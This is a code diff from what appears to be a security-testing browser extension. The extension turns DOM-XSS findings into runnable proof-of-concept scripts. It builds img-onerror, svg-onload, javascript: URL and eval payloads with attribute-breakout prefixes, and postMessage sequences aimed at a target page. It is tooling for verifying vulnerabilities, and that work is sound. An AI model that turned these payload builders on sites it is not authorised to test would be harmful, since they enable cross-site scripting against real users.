@@ -6028,11 +6028,14 @@ function handleContentMessage(msg, sender) {
   // probe marker. Correlate to an open exploit-probe session via the
   // hit's own marker (carried in the URL at probe time) and append.
   if (msg.type === "PROBE_HIT") {
-    if (msg.hit && typeof msg.hit.marker === "string") {
-      const ses = _probeSessions.get(msg.hit.marker);
+    // The hit carries the finding's crypto.randomUUID (`id`) the PoC payload
+    // passed to apiclientsink — correlate to the session by that id. (Legacy
+    // `marker` field tolerated for safety.)
+    const hid = msg.hit && (msg.hit.id || msg.hit.marker);
+    if (typeof hid === "string") {
+      const ses = _probeSessions.get(hid);
       if (ses) {
-        // Record tabId + frameId so the reviewer can see which frame fired
-        ses.hits.push(Object.assign({}, msg.hit, { tabId: tabId, frameId: sender.frameId || 0 }));
+        ses.hits.push(Object.assign({}, msg.hit, { id: hid, tabId: tabId, frameId: sender.frameId || 0 }));
       }
     }
     return;
@@ -6724,7 +6727,9 @@ async function handlePopupMessage(msg, _sender, sendResponse) {
     case "EXPLOIT_PROBE_START": {
       try {
         const session = startExploitProbe(msg);
-        sendResponse({ success: true, sessionId: session.marker });
+        // Return the EXACT PoC JS so the popup displays AND the sandbox runs the
+        // one artifact. error surfaces a build failure (e.g. opaque page URL).
+        sendResponse({ success: true, sessionId: session.marker, pocJs: session.pocJs || null, error: session.error || null });
       } catch (e) {
         sendResponse({ error: (e && e.message) || String(e) });
       }
@@ -6737,7 +6742,12 @@ async function handlePopupMessage(msg, _sender, sendResponse) {
     case "EXPLOIT_PROBE_STATUS": {
       const ses = msg.sessionId ? _probeSessions.get(msg.sessionId) : null;
       if (!ses) { sendResponse({ error: "session not found or expired" }); return; }
-      sendResponse({
+      // Correlation is via the relayed apiclientsink(<id>) hits (content.js →
+      // PROBE_HIT), which content.js drains durably from the documentElement
+      // mirror even if it loaded after the sink fired. No tab-finding / flag-read
+      // needed: hits arrive by id.
+      {
+        sendResponse({
         success: true,
         status: ses.status,
         marker: ses.marker,
@@ -6745,6 +6755,11 @@ async function handlePopupMessage(msg, _sender, sendResponse) {
         pageUrl: ses.pageUrl,
         hits: ses.hits.slice(),
         executed: ses.executed || null,
+        // The EXACT PoC JavaScript that was run on the attacker origin — the
+        // single artifact the UI both displays and executes (no separate
+        // payload system). A researcher copies this and runs it verbatim.
+        pocJs: ses.pocJs || null,
+        attackerOrigin: PROBE_ATTACKER_ORIGIN,
         startedAt: ses.createdAt,
         finishedAt: ses.finishedAt || null,
         error: ses.error || null,
@@ -6766,7 +6781,8 @@ async function handlePopupMessage(msg, _sender, sendResponse) {
           targetUrl: ses.recipe && ses.recipe.targetUrl || null,
           events: ses.recipe && Array.isArray(ses.recipe.events) ? ses.recipe.events : null,
         },
-      });
+        });
+      }
       return;
     }
 
@@ -6988,54 +7004,27 @@ async function handlePopupMessage(msg, _sender, sendResponse) {
  */
 // ─── Exploit probe (interactive per-finding verification) ─────────────────
 
-// Construct the active payload that proves EXECUTION (not just taint
-// reach). Three payload strings, all keyed by the same marker so the
-// post-probe read can correlate:
-//   - html: an <img src=x onerror="..."> fragment. If the page
-//     innerHTMLs the probe input, the img fails to load, onerror runs,
-//     and window.__apisec_fired_<marker>.html gets a timestamp. This
-//     is the real "alert(origin)"-class proof for DOM XSS.
-//   - js: a statement that sets the same flag. If the page passes the
-//     probe input to eval() / new Function(), the flag is set.
-//   - href: a javascript: URL that, if assigned to location.href, sets
-//     the flag via its expression body.
-// Markers are suffixed with a random probe-id so multiple probes in
-// the same tab don't collide.
+// Construct the active payload that proves EXECUTION (not just taint reach).
+// Every vector calls `apiclientsink("<id>")` — intercept.js's always-installed
+// beacon — with the finding's crypto.randomUUID. A call means the browser
+// ACTUALLY ran the payload through its pipeline (HTML parser → event handler,
+// eval, javascript: navigation); the id is relayed (intercept.js → content.js →
+// offscreen) and correlated to this session. The id lives INSIDE the payload,
+// never in the URL. CSP-correct: if CSP blocks the handler, apiclientsink is
+// never called → honestly NOT REPRODUCED.
 function _probePayloads(marker) {
-  // Identifier-safe — marker is already [A-Z0-9_] so we can use it as
-  // a property suffix without escaping.
-  const flag = "__apisec_fired_" + marker;
-  // Sequence-expression setter: returns Date.now() after initialising
-  // `self.<flag>` as an object. Callers append `.key=Date.now()` and a
-  // CLOSING `)` — the opener is included here, closer is caller-side
-  // because html/svg/href embed it in attribute-quoted context where
-  // the ')' must be balanced at the embedding layer.
-  const setter =
-    "(self." + flag + "=(self." + flag + "||{}),self." + flag;
-  // CSP-tolerant DOM-presence id: creates a <div> in the DOM if the
-  // payload is HTML-parsed, even when the page blocks inline event
-  // handlers. Post-observation, getElementById reveals parsing.
-  const domId = "__apisec_dom_" + marker;
+  // marker is a crypto.randomUUID — `[0-9a-f-]`, safe inside a double-quoted JS
+  // string literal with no escaping.
+  const call = 'apiclientsink("' + marker + '")';
   return {
-    flag: flag,
-    domId: domId,
-    // html: <img> that fires onerror even when src fails.
-    // The onerror value is itself a sequence-expression, balanced here.
-    html: '<img src=x onerror=\'' + setter + '.html=Date.now())\'>',
-    // js: complete expression-statement for eval() / Function(). Closing
-    // ')' balances the setter's opener so eval(js) doesn't SyntaxError.
-    js: setter + '.js=Date.now())',
-    // href: javascript: URL — balance the setter's paren; trailing `//`
-    // swallows anything appended by the sink.
-    href: 'javascript:' + setter + '.href=Date.now())//',
-    // svg: alternate HTML vector — some sanitizers strip <img> but miss <svg>
-    svg: '<svg onload=\'' + setter + '.svg=Date.now())\'></svg>',
-    // dom: CSP-tolerant signal. No script execution required — the
-    // browser only needs to PARSE the HTML for a div with this id to
-    // end up in the document. getElementById proves parsing happened.
-    // Works on sites with strict `script-src 'none'` where onerror
-    // would be silently dropped.
-    dom: '<div id="' + domId + '" data-apisec="' + marker + '"></div>',
+    // html: <img> whose failed load fires onerror (DOM-XSS via innerHTML/write).
+    html: '<img src=x onerror=\'' + call + '\'>',
+    // js: bare statement for eval() / new Function() / setTimeout(string) sinks.
+    js: call,
+    // href: javascript: URL for location.href / src / href-attribute sinks.
+    href: 'javascript:' + call + '//',
+    // svg: alternate HTML vector — some sanitizers strip <img> but miss <svg>.
+    svg: '<svg onload=\'' + call + '\'></svg>',
   };
 }
 
@@ -7082,44 +7071,245 @@ function _buildProbeUrl(pageUrl, strategy, marker, opts) {
     // In pure-body contexts these leading chars render as text and do
     // no harm; <img>/<svg> still parse. This is a PARSING FACT about
     // HTML, not a heuristic about sinks.
-    activePayload = '"\'></script>' + pl.html + pl.svg + pl.dom;
+    activePayload = '"\'></script>' + pl.html + pl.svg;
   }
+  // The URL carries ONLY the genuine attacker payload (which itself contains the
+  // apiclientsink(<id>) call that correlates the hit) — NEVER a separate marker
+  // token. A hash is not sent to the server, so it must not influence analysis.
   if (strategy === "hash" || strategy === "postmessage") {
-    // Hash payload combines the sentinel (__apisec=MARKER) with the
-    // active payload. Pages that decode location.hash and innerHTML
-    // it will both (a) trip intercept.js sink wrappers on the marker
-    // AND (b) expose an execution proof via one of the vectors.
-    const active = "__apisec=" + marker + "&p=" + encodeURIComponent(activePayload);
-    u.hash = "#" + active;
+    u.hash = "#" + encodeURIComponent(activePayload);
   } else if (strategy === "search") {
-    // The caller MUST supply the param name the finding observed the
-    // page reading. We don't guess — a hardcoded list of common names
-    // is a heuristic that gives false positives (wrong key picked,
-    // page echoes it somewhere unrelated) AND false negatives (app
-    // uses a project-specific name not in our list). The AST finding
-    // already knows which name its sink traced back to; the caller
-    // derives it from the finding and passes it through.
+    // The caller MUST supply the param name the finding observed the page
+    // reading. We never guess a key — the finding already knows which name its
+    // sink traced back to; the caller derives it from the finding.
     if (!opts || !opts.paramName) {
       throw new Error("search strategy requires opts.paramName — the query key the finding observed the page reading");
     }
-    u.searchParams.set("__apisec", marker);
     u.searchParams.set(opts.paramName, activePayload);
   } else if (strategy === "pathname") {
-    u.pathname = u.pathname.replace(/\/?$/, "/") + marker;
+    u.pathname = u.pathname.replace(/\/?$/, "/") + encodeURIComponent(activePayload);
   }
   return u.href;
 }
 
-function _waitForTabLoaded(tabId, timeoutMs) {
-  // The offscreen can't observe chrome.tabs.onUpdated; the SW forwards each
-  // update as __evt TAB_UPDATED, which _onTabUpdated fans out to these listeners.
-  return new Promise((resolve) => {
-    let done = false;
-    const finish = () => { if (done) return; done = true; clearTimeout(to); _tabUpdatedListeners.delete(listener); resolve(); };
-    const to = setTimeout(finish, timeoutMs || 15000);
-    const listener = (id, info) => { if (id === tabId && info.status === "complete") finish(); };
-    _tabUpdatedListeners.add(listener);
+// The real cross-origin attacker origin the PoC runs on. A minimal, stable,
+// CSP-free page (IANA's reserved example domain) so the injected PoC can frame
+// the target and run without the attacker page's own policy interfering. This
+// is what a researcher would paste the PoC onto.
+const PROBE_ATTACKER_ORIGIN = "https://example.com/";
+
+// Build the structured-clone payload a postMessage PoC delivers to the framed
+// target: the active vectors shaped to the handler's observed field path, with
+// AST-extracted preconditions merged and the source's decoder chain pre-applied
+// in reverse. Extracted so the PoC-JS builder and any caller share one shaping.
+function _shapePostMessagePayload(marker, opts) {
+  opts = opts || {};
+  const payloads = _probePayloads(marker);
+  let activeStr;
+  if (opts.sinkType === "eval") activeStr = payloads.js + "/*" + marker + "*/";
+  else if (opts.sinkType === "redirect") activeStr = payloads.href;
+  else activeStr = '"\'></script>' + payloads.html + payloads.svg;
+  let shaped = activeStr;
+  const fieldPath = Array.isArray(opts.fieldPath) ? opts.fieldPath : [];
+  for (let i = fieldPath.length - 1; i >= 0; i--) shaped = { [fieldPath[i]]: shaped };
+  const precs = Array.isArray(opts.preconditions) ? opts.preconditions : [];
+  for (const p of precs) {
+    if (!p || !Array.isArray(p.path) || p.op !== "===") continue;
+    if (typeof shaped !== "object" || shaped === null) shaped = { __apisec_root: shaped };
+    let cur = shaped;
+    for (let i = 0; i < p.path.length - 1; i++) {
+      const key = p.path[i];
+      if (typeof cur[key] !== "object" || cur[key] === null) cur[key] = {};
+      cur = cur[key];
+    }
+    if (p.path.length === 0) continue;
+    cur[p.path[p.path.length - 1]] = p.value;
+  }
+  if (shaped && typeof shaped === "object" && Object.keys(shaped).length === 1 &&
+      Object.prototype.hasOwnProperty.call(shaped, "__apisec_root")) {
+    shaped = shaped.__apisec_root;
+  }
+  const decs = Array.isArray(opts.decoders) ? opts.decoders : [];
+  for (let i = decs.length - 1; i >= 0; i--) {
+    const d = decs[i];
+    try {
+      if (d === "json") shaped = JSON.stringify(shaped);
+      else if (d === "escape") shaped = escape(String(shaped));
+      else if (d === "uri-component") shaped = encodeURIComponent(String(shaped));
+      else if (d === "uri") shaped = encodeURI(String(shaped));
+      else if (d === "base64") shaped = btoa(unescape(encodeURIComponent(String(shaped))));
+    } catch (e) {
+      console.warn("[brain] PoC pre-encode failed:", e && e.message || e, "decoder=" + d);
+    }
+  }
+  return shaped;
+}
+
+// THE single PoC artifact: the exact attacker JavaScript the UI displays AND the
+// Run button executes verbatim on PROBE_ATTACKER_ORIGIN. It frames (or frames +
+// postMessages) the target cross-origin; the target's OWN vulnerable code reads
+// the attacker input and reaches the sink inside the frame. `apiclientsink(...)`
+// is the instrumentation proof hook intercept.js arms from the __apisec marker
+// in the framed URL (runs at document_start in all frames); a researcher swaps
+// it for a real payload to demo live. Gesture-free by construction — iframe +
+// cross-origin postMessage need no user activation, unlike window.open (which
+// the popup blocker kills in an injected context, with no `debugger` permission
+// to synthesize a gesture). Targets that send X-Frame-Options / frame-ancestors
+// can't be framed; the PoC is still the honest attacker code and verification
+// honestly reports NOT REPRODUCED rather than faking it.
+// Compile a Z3 pocPlan into one self-contained attacker script handling complex
+// multi-step state: combined URL gates + an ORDERED postMessage sequence, with
+// the apiclientsink payload woven into the one sink-bearing field/event (other
+// fields keep their Z3-solved gate values so guards like `type==="render"`
+// still pass). Storage/cookie gates are NOT attacker-settable cross-origin, so
+// they are emitted as honest PRECONDITION comments — the exploit only fires if
+// the victim already has that state (a real finding nuance, never faked).
+function _buildPocJsFromPlan(pageUrl, marker, plan, opts) {
+  // The Z3 model already solved the EXACT exploit value for the sink-bearing
+  // field (emitted by qjs_z3_emit_poc into the @P/pocPlan event) — granular to
+  // THIS code path, not a template. We must USE that solved value, only weaving
+  // the proof hook into it: the engine's solved exploit expresses its payload as
+  // `alert(document.domain)`, so substitute `apiclientsink("<id>")` there so the
+  // run is detectable + correlated WITHOUT discarding Z3's solved structure.
+  const proofCall = 'apiclientsink("' + marker + '")';
+  function weaveProof(v) {
+    if (typeof v === "string" && /alert\s*\(\s*document\.domain\s*\)/.test(v)) {
+      return v.replace(/alert\s*\(\s*document\.domain\s*\)/g, proofCall);
+    }
+    return v;
+  }
+  // Fallback ONLY when no Z3-solved value is present on the sink field (e.g. the
+  // engine emitted no @P payload for it) — never overrides a solved value.
+  const fallback = (function () {
+    const pl = _probePayloads(marker);
+    if (opts.sinkType === "eval") return pl.js;
+    if (opts.sinkType === "redirect") return pl.href;
+    return '"\'></script>' + pl.html + pl.svg;
+  })();
+  // URL with the plan's gate components. The attacker controls hash/search/path
+  // the victim's URL carries; weave the active payload into the URL only when no
+  // event carries the sink (pure URL-source plan).
+  function setByPath(obj, dotPath, val) {
+    const parts = String(dotPath).split(".");
+    let cur = obj;
+    for (let i = 0; i < parts.length - 1; i++) {
+      if (typeof cur[parts[i]] !== "object" || cur[parts[i]] === null) cur[parts[i]] = {};
+      cur = cur[parts[i]];
+    }
+    cur[parts[parts.length - 1]] = val;
+  }
+  function getByPath(obj, dotPath) {
+    const parts = String(dotPath).split(".");
+    let cur = obj;
+    for (let i = 0; i < parts.length; i++) { if (cur == null) return undefined; cur = cur[parts[i]]; }
+    return cur;
+  }
+  let url;
+  try { url = new URL(pageUrl); } catch (_) { url = null; }
+  const events = Array.isArray(plan.events) ? plan.events.slice().sort((a, b) => (a.seq || 0) - (b.seq || 0)) : [];
+  const sinkEvent = events.find((e) => e.carriesPayload);
+  if (url) {
+    // URL gate components are Z3-SOLVED values — used verbatim (proof woven if
+    // the solved value is itself the exploit string).
+    if (plan.url && plan.url.pathname) url.pathname = plan.url.pathname;
+    if (plan.url && plan.url.search) url.search = weaveProof(plan.url.search);
+    if (plan.url && plan.url.hash) { const h = weaveProof(plan.url.hash); url.hash = h[0] === "#" ? h : "#" + h; }
+    if (!sinkEvent && !events.length && !(plan.url && (plan.url.hash || plan.url.search))) {
+      // No solved URL gate and no events — last-resort fallback vector.
+      url.hash = (url.hash ? url.hash + "&" : "#") + encodeURIComponent(fallback);
+    }
+  }
+  const targetUrl = url ? url.href : pageUrl;
+  const builtEvents = events.map((e) => {
+    let payload = (e.payload && typeof e.payload === "object") ? JSON.parse(JSON.stringify(e.payload)) : e.payload;
+    if (e.carriesPayload) {
+      if (e.payloadField) {
+        if (typeof payload !== "object" || payload === null) payload = {};
+        const solved = getByPath(payload, e.payloadField);
+        // USE the Z3-solved sink value (proof woven); fall back only if absent.
+        setByPath(payload, e.payloadField, solved != null ? weaveProof(solved) : fallback);
+      } else {
+        payload = (typeof payload === "string" && payload) ? weaveProof(payload) : fallback;
+      }
+    } else if (typeof payload === "string") {
+      payload = weaveProof(payload);   // a gate field may itself be the solved exploit string
+    }
+    return payload;
   });
+  // Honest preconditions the attacker cannot set cross-origin.
+  let pre = "";
+  const stor = Array.isArray(plan.storage) ? plan.storage : [];
+  const cook = Array.isArray(plan.cookies) ? plan.cookies : [];
+  if (stor.length || cook.length) {
+    pre = "// PRECONDITION — the victim must already have this state (an attacker\n"
+        + "// CANNOT set another origin's storage/cookies; the exploit fires only if):\n";
+    stor.forEach((s) => { pre += "//   localStorage[" + JSON.stringify(s.key) + "] === " + JSON.stringify(s.value) + "\n"; });
+    cook.forEach((c) => { pre += "//   document.cookie contains " + JSON.stringify(c.value) + "\n"; });
+  }
+  if (!builtEvents.length) {
+    // URL-only complex plan (combined gates, no events).
+    return pre + "(function () {\n  window.open(" + JSON.stringify(targetUrl) + ", '_blank');\n})();\n";
+  }
+  // Open the gated target, then dispatch the ordered postMessage sequence. The
+  // opener handle is retained (COOP same-origin-allow-popups), so cross-origin
+  // postMessage to the opened window works.
+  const lines = [];
+  lines.push("(function () {");
+  lines.push("  var w = window.open(" + JSON.stringify(targetUrl) + ", '_blank');");
+  lines.push("  if (!w) { alert('allow popups for this PoC (the sequence needs the opened window)'); return; }");
+  lines.push("  var SEQ = " + JSON.stringify(builtEvents) + ";");
+  lines.push("  SEQ.forEach(function (data, i) {");
+  lines.push("    setTimeout(function () { try { w.postMessage(data, '*'); } catch (e) {} }, 500 + i * 600);");
+  lines.push("  });");
+  lines.push("})();");
+  return pre + lines.join("\n") + "\n";
+}
+
+function _buildPocJs(pageUrl, marker, opts) {
+  opts = opts || {};
+  const strategy = opts.strategy || "hash";
+  const header =
+    "// API-Client PoC — run on any attacker origin (e.g. https://example.com).\n" +
+    "// Opens the target in a real window with the attacker-controlled input; the\n" +
+    "// target's OWN code reads it and reaches the sink. apiclientsink(...) is the\n" +
+    "// proof hook (replace with e.g. alert(document.domain) to demonstrate live).\n" +
+    "// window.open needs a user gesture — clicking Run provides it.\n";
+  // COMPLEX-STATE path: a Z3 pocPlan with an ordered event sequence and/or
+  // combined URL gates compiles to ONE self-contained attacker script (open the
+  // target at the gated URL, then dispatch the postMessage sequence in order,
+  // weaving the apiclientsink payload into the sink-bearing field). Same single
+  // artifact — displayed AND executed.
+  const plan = opts.pocPlan;
+  if (plan && ((Array.isArray(plan.events) && plan.events.length) ||
+               (plan.url && (plan.url.hash || plan.url.search || plan.url.pathname)))) {
+    return header + _buildPocJsFromPlan(pageUrl, marker, plan, opts);
+  }
+  if (strategy === "postmessage") {
+    // Marker in the opened URL arms intercept.js in the target so the sink
+    // wrappers + apiclientsink are present when the posted payload lands.
+    const targetUrl = _buildProbeUrl(pageUrl, "hash", marker, opts);
+    const shaped = _shapePostMessagePayload(marker, opts);
+    return header +
+      "(function () {\n" +
+      "  var TARGET = " + JSON.stringify(targetUrl) + ";\n" +
+      "  var DATA = " + JSON.stringify(shaped) + ";\n" +
+      "  var w = window.open(TARGET, '_blank');\n" +
+      "  if (!w) { alert('popup blocked — allow popups for this PoC'); return; }\n" +
+      "  [300, 1500, 3500].forEach(function (d) {\n" +
+      "    setTimeout(function () { try { w.postMessage(DATA, '*'); } catch (e) {} }, d);\n" +
+      "  });\n" +
+      "})();\n";
+  }
+  // URL-source strategies (hash / search / pathname): payload is in the opened
+  // URL; the page reads its own location and reaches the sink. We do NOT inspect
+  // window.open's return — from a sandboxed/cross-origin opener it returns null
+  // even on success (severed opener handle), so a null check would be a false
+  // "blocked" alarm. The navigation is what matters here, not the handle.
+  const targetUrl = _buildProbeUrl(pageUrl, strategy, marker, opts);
+  return header +
+    "(function () {\n" +
+    "  window.open(" + JSON.stringify(targetUrl) + ", '_blank');\n" +
+    "})();\n";
 }
 
 // Sessions persist past completion so the popup can reopen after the
@@ -7144,20 +7334,19 @@ function _pruneProbeSessions() {
   }
 }
 
-// Start an exploit probe, return the session handle immediately. The
-// actual tab-opening + observation happens async in _runExploitProbe;
-// its outcome lands back on the session object where pollers can see
-// it. No await for the run — popup callers are non-blocking.
+// Prepare an exploit probe: build THE PoC artifact (_buildPocJs) and register a
+// session keyed by the finding's crypto.randomUUID for hit-correlation. No tab
+// is opened — the USER runs the PoC by clicking inside the sandboxed attacker
+// page (poc-sandbox.html); that click is the user activation window.open needs.
 function startExploitProbe(msg) {
   _pruneProbeSessions();
   const { strategy, waitMs, findingId, paramName, fieldPath, sinkType, sinkName, decoders, preconditions, pocPlan } = msg || {};
-  // pocPlan: the structured multi-source PoC produced by the Z3 solver
-  // (securitySinks[i].poc), routes through _runStructuredPlan instead of
-  // the legacy single-strategy path. {url:{hash,search,pathname},
-  // events:[{kind,seq,payload,carriesPayload}], storage:[],
-  // cookies:[], verify:"marker"}. Strategy is OPTIONAL when pocPlan
-  // is present (the plan dictates the dispatch — postMessage sequence,
-  // URL components, storage pre-injection).
+  // pocPlan: the Z3-solved structured PoC (securitySinks[i].poc). _buildPocJs
+  // compiles it (via _buildPocJsFromPlan) into one self-contained script:
+  // {url:{hash,search,pathname}, events:[{kind,seq,payload,carriesPayload}],
+  // storage:[], cookies:[], verify:"marker"}. Strategy is OPTIONAL when pocPlan
+  // is present (the plan's solved values dictate the URL gates + postMessage
+  // sequence; storage/cookies become honest victim-preconditions, not faked).
   if (!strategy && !pocPlan) throw new Error("strategy required (hash | search | pathname | postmessage) or pocPlan from finding.poc");
   if (strategy === "search" && !paramName) {
     throw new Error("search strategy requires paramName — derive it from the finding's observed source (e.g. the argument to URLSearchParams.get)");
@@ -7180,7 +7369,12 @@ function startExploitProbe(msg) {
   }
 
   const wait = Math.max(1000, Math.min(30000, Number(waitMs) || 5000));
-  const marker = "PROBE_" + Math.random().toString(36).slice(2, 10).toUpperCase();
+  // The correlation id is a crypto.randomUUID — it rides INSIDE the PoC payload
+  // (apiclientsink("<id>")), is relayed back by intercept.js → content.js, and
+  // keys this session. Never placed in the URL.
+  const marker = (self.crypto && crypto.randomUUID)
+    ? crypto.randomUUID()
+    : ("probe-" + Date.now().toString(36) + "-" + Math.random().toString(36).slice(2, 10));
   const session = {
     marker, status: "running", strategy: strategy || (pocPlan ? "pocPlan" : null),
     pageUrl: pageUrl || null,
@@ -7194,463 +7388,28 @@ function startExploitProbe(msg) {
     waitMs: wait,
     hits: [], openedTabs: [], createdAt: Date.now(), finishedAt: null, error: null,
   };
+  // Build THE PoC artifact and register the session for hit-correlation. We do
+  // NOT auto-open any tab: the PoC is executed by the USER clicking Run inside
+  // the sandboxed attacker page (poc-sandbox.html) — that real click is the user
+  // activation window.open needs, and the sandbox's opaque origin is a genuine
+  // cross-origin attacker context. The SAME pocJs is what the popup displays.
+  // When the PoC fires the sink, intercept.js → content.js → PROBE_HIT lands on
+  // this session's marker, and EXPLOIT_PROBE_STATUS reports REAL EXPLOIT.
+  try {
+    session.pocJs = _buildPocJs(pageUrl, marker, {
+      strategy: strategy || (pocPlan ? "postmessage" : "hash"),
+      sinkType, sinkName, paramName, pocPlan: pocPlan || null,
+      fieldPath: session.fieldPath, decoders: session.decoders, preconditions: session.preconditions,
+    });
+  } catch (e) {
+    session.pocJs = null;
+    session.error = "PoC build failed: " + ((e && e.message) || String(e));
+  }
+  session.status = "prepared";
   _probeSessions.set(marker, session);
-  _runExploitProbe(session).catch((e) => {
-    session.status = "error";
-    session.error = (e && e.message) || String(e);
-    session.finishedAt = Date.now();
-  });
   return session;
 }
 
-// Read the per-marker execution flag from a tab. Returns an object
-// like { html: timestamp, svg: timestamp, js: timestamp, href: timestamp }
-// where each key corresponds to a payload variant that actually ran —
-// that's the PROOF OF EXECUTION, distinguishing "taint reached a
-// sink" (intercept.js wrappers saw the marker) from "the sink
-// actually parsed it as HTML / evaluated it as JS". Returns null if
-// no payload fired.
-async function _readProbeExecFlag(tabId, marker) {
-  try {
-    const flagName = "__apisec_fired_" + marker;
-    // chrome.scripting lives in the SW; it runs the predefined `readExecFlag`
-    // injector (reads `self[flag]` set by intercept.js's apiclientsink) in every
-    // frame and returns the per-frame results for us to merge.
-    const results = await swRpc("scripting.exec", { op: "readExecFlag", tabId, allFrames: true, args: [flagName] });
-    const merged = {};
-    for (const r of results || []) {
-      if (!r || !r.result) continue;
-      for (const k of Object.keys(r.result)) {
-        if (!merged[k] || r.result[k] > merged[k]) merged[k] = r.result[k];
-      }
-    }
-    return Object.keys(merged).length ? merged : null;
-  } catch (_) {
-    return null;
-  }
-}
-
-// For postmessage: the target window is opened by the attacker via
-// window.open — we didn't create that tab, so we have to find it by
-// URL. The attacker uses _buildProbeUrl(pageUrl, "hash", marker) so
-// we match on that canonical form.
-async function _findProbeTargetTab(pageUrl, marker) {
-  try {
-    const tabs = await swRpc("tabs.query", {});
-    const needleMarker = "__apisec=" + marker;
-    for (const t of tabs) {
-      if (t.url && t.url.indexOf(needleMarker) !== -1) return t.id;
-    }
-  } catch (e) {
-    /* tabs.query failed (SW RPC error, restricted permission, etc.)
-       — the postMessage probe can't find its target tab so the
-       finding reports NOT REPRODUCED. Surface so a real RPC outage
-       is diagnosable instead of looking like "the exploit just
-       didn't fire". */
-    console.warn("[brain] _findProbeTargetTab tabs.query failed:", e && e.message || e, "pageUrl=" + pageUrl);
-  }
-  return null;
-}
-
-async function _runExploitProbe(session) {
-  // The caller MUST supply pageUrl — it comes from the finding's own
-  // observed pageUrl (globalStore.securityFindings entry's pageUrl is
-  // set when the finding was recorded on a tab). We never guess which
-  // tab to probe against: if the caller doesn't know where the finding
-  // was observed, we refuse to probe rather than hit a random tab.
-  if (!session.pageUrl || !/^https?:/i.test(session.pageUrl)) {
-    throw new Error("pageUrl required — caller should read it from the finding's stored pageUrl (globalStore.securityFindings[sourceUrl].pageUrl)");
-  }
-  if (session.pocPlan) {
-    return _runStructuredPlan(session);
-  }
-
-  let execReadTabId = null;
-  let attackerPostedTargetUrl = null;
-  try {
-    if (session.strategy === "postmessage") {
-      // Cross-origin attacker tabs that window.open the target are
-      // dead: chrome.scripting injection has no user gesture, the
-      // popup blocker kills window.open silently, the target tab
-      // never opens, NOT REPRODUCED. chrome.tabs.create from the
-      // extension is privileged and not subject to the popup blocker.
-      // Same-window postMessage (window.postMessage(payload, "*"))
-      // reaches the bundle's message handler identically — the
-      // handler's gates inspect e.data shape, not e.origin.
-      const targetWithMarker = _buildProbeUrl(session.pageUrl, "hash", session.marker, { sinkType: session.sinkType, sinkName: session.sinkName });
-      attackerPostedTargetUrl = targetWithMarker;
-      const payloads = _probePayloads(session.marker);
-      // Build the payload SHAPE from the finding's observed field
-      // path (taint path member hops). No hardcoded field-name list
-      // — if the handler reads event.data.payload.html, the probe
-      // delivers {payload:{html:<active>}}. Empty fieldPath = the
-      // handler treats event.data as a plain string, so we send a
-      // raw string containing the active vectors.
-      //    activeStr — the HTML/SVG/DOM concatenation, carrying the
-      //      marker in multiple vectors (onerror flag, svg onload,
-      //      DOM-presence div).
-      // Postmessage payload shape depends on sink type — eval needs a
-      // JS statement, redirect needs a javascript: URL, xss/default need
-      // HTML vectors (with attribute-breakout prefix). Marker prefix is
-      // included in every case so the intercept.js sink wrappers see
-      // the sentinel whatever shape the handler unpacks it into.
-      let activeStr;
-      if (session.sinkType === "eval") activeStr = payloads.js + "/*" + session.marker + "*/";
-      else if (session.sinkType === "redirect") activeStr = payloads.href;
-      else activeStr = session.marker + ' "\'></script>' + payloads.html + payloads.svg + payloads.dom;
-      let shaped = activeStr;
-      for (let i = (session.fieldPath || []).length - 1; i >= 0; i--) {
-        shaped = { [session.fieldPath[i]]: shaped };
-      }
-      // Merge preconditions the AST extracted from reachability guards
-      // (if/switch/early-return). Each precondition pins a property
-      // path to a literal — we set that value on the shaped payload so
-      // the handler's guard passes and execution reaches the sink.
-      // The path is rooted at the same object as fieldPath (MessageEvent
-      // data after dropping the implicit .data hop), so we walk into
-      // `shaped` with the same property chain.
-      const _precs = Array.isArray(session.preconditions) ? session.preconditions : [];
-      for (const p of _precs) {
-        if (!p || !Array.isArray(p.path) || p.op !== "===") continue;
-        // If the shaped payload is a primitive (no fieldPath), wrap it
-        // so we can add sibling properties for the precondition.
-        if (typeof shaped !== "object" || shaped === null) shaped = { __apisec_root: shaped };
-        let cur = shaped;
-        for (let i = 0; i < p.path.length - 1; i++) {
-          const key = p.path[i];
-          if (typeof cur[key] !== "object" || cur[key] === null) cur[key] = {};
-          cur = cur[key];
-        }
-        if (p.path.length === 0) continue;
-        cur[p.path[p.path.length - 1]] = p.value;
-      }
-      // If we injected the __apisec_root wrapper but no precondition
-      // actually required wrapping, unwrap — the handler expects the
-      // bare value as event.data.
-      if (shaped && typeof shaped === "object" && Object.keys(shaped).length === 1 &&
-          Object.prototype.hasOwnProperty.call(shaped, "__apisec_root")) {
-        shaped = shaped.__apisec_root;
-      }
-      // Apply the inverse of each decoder on the taint path in REVERSE
-      // order (the handler applies decoders source→sink; we pre-encode
-      // sink→source so the decoder chain unpacks back to `shaped`).
-      // Each transformer here must mirror a decoder the AST observed —
-      // no speculative encoding.
-      const _decs = Array.isArray(session.decoders) ? session.decoders : [];
-      for (let i = _decs.length - 1; i >= 0; i--) {
-        const d = _decs[i];
-        try {
-          if (d === "json") shaped = JSON.stringify(shaped);
-          else if (d === "escape") shaped = escape(String(shaped));
-          else if (d === "uri-component") shaped = encodeURIComponent(String(shaped));
-          else if (d === "uri") shaped = encodeURI(String(shaped));
-          else if (d === "base64") shaped = btoa(unescape(encodeURIComponent(String(shaped))));
-        } catch (e) {
-          /* Pre-encoding step failed — common when `shaped` contains
-             characters outside the encoder's domain (e.g. raw bytes
-             through btoa, lone surrogates through encodeURI). The probe
-             would deliver a partially-encoded payload that the bundle's
-             decoder chain can't unpack, so the exploit looks NOT
-             REPRODUCED when actually the payload never assembled. */
-          console.warn("[brain] probe pre-encode failed:", e && e.message || e, "decoder=" + d);
-        }
-      }
-      const tgtTab = await swRpc("tabs.create", { url: targetWithMarker, active: false });
-      session.openedTabs.push(tgtTab.id);
-      execReadTabId = tgtTab.id;
-      await _waitForTabLoaded(tgtTab.id, 10000);
-      // Same-window postMessage to the bundle's own listener (the predefined
-      // `postMessage` injector, retried to cover async handler-registration races)
-      // — run by the SW since chrome.scripting isn't available in the offscreen.
-      await swRpc("scripting.exec", { op: "postMessage", tabId: tgtTab.id, args: [shaped] });
-      await new Promise((r) => setTimeout(r, 4000 + session.waitMs));
-    } else {
-      // URL-reachable strategies: new tab navigated to targetUrl with
-      // marker + active payload embedded. intercept.js arms wrappers
-      // at document_start; if the page consumes location.hash|search|
-      // pathname and routes it to a sink, the active payload fires.
-      const probeUrl = _buildProbeUrl(session.pageUrl, session.strategy, session.marker, { paramName: session.paramName, sinkType: session.sinkType, sinkName: session.sinkName });
